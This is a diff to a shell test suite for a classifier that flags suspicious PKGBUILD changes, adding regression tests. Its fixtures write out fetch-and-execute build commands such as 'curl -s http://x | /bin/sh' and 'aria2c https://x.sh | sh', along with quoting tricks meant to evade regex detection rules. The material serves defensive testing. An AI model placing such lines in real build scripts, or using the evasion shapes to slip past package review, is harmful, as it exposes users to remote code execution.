@@ -5306,7 +5306,7 @@ EOF
   # Alternative fetchers (aria2c, socat, nc, tftp, rsync, python urllib) are
   # intentionally NOT name-blacklisted. The fail-closed classifier sends these
   # added shell statements to review, not clean. These tests pin that behavior.
-  local _aria_new_pkg _pyurl_new_pkg _ansic_new_pkg
+  local _aria_new_pkg _pyurl_new_pkg _ansic_new_pkg _gh6_evasion_pkg
   printf -v _aria_new_pkg 'pkgname=cls-pkg\npkgver=1.1\npkgrel=1\nsource=("https://example.com/pkg-1.tar")\nsha256sums=(%s)\nbuild() {\n  aria2c https://x.sh | sh\n}' "$_sum1"
   printf -v _pyurl_new_pkg 'pkgname=cls-pkg\npkgver=1.1\npkgrel=1\nsource=("https://example.com/pkg-1.tar")\nsha256sums=(%s)\nbuild() {\n  python3 -c "import urllib.request; urllib.request.urlretrieve('"'"'https://x.sh'"'"', '"'"'/tmp/x.sh'"'"')"\n  sh /tmp/x.sh\n}' "$_sum1"
   printf -v _ansic_new_pkg 'pkgname=cls-pkg\npkgver=1.1\npkgrel=1\nsource=($'"'"'https://example.com/pkg-1.tar'"'"')\nsha256sums=(%s)' "$_sum1"
@@ -5316,6 +5316,13 @@ EOF
     "$_old_basic" "$_pyurl_new_pkg" "$_old_src" "$_new_src"
   tc_class ansic-quote-source-array-review review 2 \
     "$_old_basic" "$_ansic_new_pkg" "$_old_src" "$_new_src"
+
+  # Finding gh6: hard rules are brittle (quoted command names, absolute
+  # interpreter paths, alternate subcommands). These shapes do not match the
+  # regex rules; the fail-closed structural classifier still routes them to review.
+  printf -v _gh6_evasion_pkg $'pkgname=cls-pkg\npkgver=1.1\npkgrel=1\nsource=("https://example.com/pkg-1.tar")\nsha256sums=(%s)\nbuild() {\n  n""pm install evil\n  \'n\'pm install evil\n  curl -s http://x | /bin/sh\n  git submodule update --init\n}' "$_sum1"
+  tc_class gh6-hard-rule-evasions-review review 2 \
+    "$_old_basic" "$_gh6_evasion_pkg" "$_old_src" "$_new_src"
 
   # Inline assertion: the review detail now points at the build-logic line
   # (install -Dm755 ./bwrap), not the earlier license=() line, and the summary
@@ -5355,6 +5362,26 @@ EOF
     log "  $(c_green "PASS") classifier-detail-build-logic-colon-in-text"; pass=$((pass+1))
   else
     log "  $(c_red "FAIL") classifier-detail-build-logic-colon-in-text (got: $_colon_out)"
+    fail=$((fail+1))
+  fi
+
+  # Regression for gh19: raw added-line text may contain a literal tab. Keep
+  # package() in the baseline so the tab-bearing command is the only added
+  # build-logic candidate, then require the complete rendered detail. Under the
+  # old tab-separated record reader, the interior tab after `install -D` split
+  # d_text early and made d_fmt begin with `-m755 ...` instead of `PKGBUILD:`.
+  local _tab_old_pkg _tab_new_pkg _tab_out _tab_expected
+  printf -v _tab_old_pkg 'pkgname=cls-pkg\npkgver=1.0\npkgrel=1\nsource=("https://example.com/pkg-1.tar")\nsha256sums=(%s)\npackage() {\n  install -Dm755 ./existing "${pkgdir}/usr/bin/existing"\n}' "$_sum1"
+  printf -v _tab_new_pkg 'pkgname=cls-pkg\npkgver=1.1\npkgrel=1\nsource=("https://example.com/pkg-1.tar")\nsha256sums=(%s)\npackage() {\n  install -Dm755 ./existing "${pkgdir}/usr/bin/existing"\n  install -D\t-m755 ./tabbed "${pkgdir}/usr/bin/tabbed"\n}' "$_sum1"
+  _class_bld "$_clx" "cls-tab-text" "$_tab_old_pkg" "$_tab_new_pkg" "$_old_src" "$_new_src"
+  LLM_AUTO_BORING=0
+  _tab_out=$(classify_diff_rules "cls-tab-text" "$_CLASS_DIR" "$_CLASS_BASE" 2>&1 >/dev/null)
+  _tab_expected=$'      added: PKGBUILD:8:   install -D\t-m755 ./tabbed "${pkgdir}/usr/bin/tabbed"'
+  if printf '%s\n' "$_tab_out" | grep -q 'package build instructions changed' \
+     && printf '%s\n' "$_tab_out" | grep -Fqx "$_tab_expected"; then
+    log "  $(c_green "PASS") classifier-detail-tab-in-text"; pass=$((pass+1))
+  else
+    log "  $(c_red "FAIL") classifier-detail-tab-in-text (got: $_tab_out)"
     fail=$((fail+1))
   fi
 
